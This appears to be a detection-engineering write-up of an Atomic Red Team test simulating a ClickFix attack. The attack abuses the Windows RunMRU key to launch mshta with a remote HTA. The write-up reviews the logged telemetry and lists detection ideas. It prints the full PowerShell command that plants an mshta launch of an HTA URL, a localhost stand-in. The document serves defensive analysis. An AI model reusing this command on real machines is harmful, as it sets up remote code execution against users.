# T1204.002-12: Malicious File — ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell

## Technique Context

T1204.002 (Malicious File) represents user execution of malicious files, a fundamental initial access and execution vector. This specific test simulates a ClickFix campaign technique where attackers abuse the Windows RunMRU registry key to establish persistence and launch mshta.exe with malicious HTA content. The RunMRU key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`) stores the most recently used commands from the Windows Run dialog and can be manipulated to execute commands when users access the Run dialog. Detection engineers focus on monitoring PowerShell registry manipulation, mshta.exe execution patterns, and suspicious RunMRU modifications since these represent common post-exploitation activities.

## What This Dataset Contains

The dataset captures a failed attempt to modify the RunMRU registry key through PowerShell. The technique execution begins with Security event 4688 showing PowerShell process creation with the full command line: `"powershell.exe" & {Set-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\" -Name \"atomictest\" -Value '\"C:\Windows\System32\mshta.exe\" http://localhost/hello6.hta'}`.

PowerShell event 4104 shows the actual script block attempting to set the registry property: `{Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'}`. Critically, PowerShell event 4103 reveals the technique failure with a NonTerminatingError: `"Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' because it does not exist."` This indicates the registry key doesn't exist on this system.

Sysmon events capture the process creation chain, with event 1 showing the child PowerShell process (PID 7220) spawned from the parent PowerShell (PID 22132), and the execution of whoami.exe (PID 14776) for system discovery. Multiple Sysmon event 7 entries show .NET Framework DLL loading and Windows Defender components being loaded into the PowerShell processes.

## What This Dataset Does Not Contain

The dataset lacks the core technique artifacts because the RunMRU registry key doesn't exist on this system. There are no registry write events (Sysmon event 13) showing successful modification of the RunMRU key, no mshta.exe process creation events, and no network connections to the malicious HTA URL. The technique essentially fails at the first step, so we don't see the intended persistence mechanism or the HTML Application execution that would demonstrate the full attack chain. Additionally, there are no Sysmon ProcessCreate events for mshta.exe since the sysmon-modular config uses include-mode filtering and the technique never progresses to that stage.

## Assessment

This dataset provides limited utility for detection engineering of the intended RunMRU abuse technique since the core attack failed. However, it offers valuable telemetry for detecting the attempt itself through PowerShell script block logging and command-line analysis. The failure scenario actually represents a realistic detection opportunity, as many environments may not have the RunMRU key present by default. The Security 4688 events with full command lines and PowerShell 4103/4104 events provide excellent visibility into the attack methodology, even when unsuccessful. For building detections of RunMRU abuse, additional datasets showing successful technique execution would be necessary.

## Detection Opportunities Present in This Data

1. **PowerShell Registry Manipulation Attempt**: Monitor PowerShell event 4104 script blocks containing "Set-ItemProperty" commands targeting "RunMRU" registry paths, especially with executable references like mshta.exe.

2. **Suspicious Command Line Patterns**: Detect Security event 4688 process creation with command lines containing RunMRU registry paths combined with mshta.exe and external URLs (http://localhost/hello6.hta pattern).

3. **PowerShell Error Patterns**: Alert on PowerShell event 4103 NonTerminatingError messages indicating attempts to access non-existent RunMRU registry paths, which may indicate reconnaissance or failed persistence attempts.

4. **Process Chain Analysis**: Monitor Sysmon event 1 for PowerShell spawning child processes with registry manipulation commands, particularly when combined with system discovery tools like whoami.exe.

5. **HTA File URL References**: Detect PowerShell script blocks referencing .hta file extensions with URLs, as this combination often indicates HTML Application-based attacks.

6. **Nested PowerShell Execution**: Watch for PowerShell processes spawning additional PowerShell instances with complex command-line arguments containing registry modification commands.
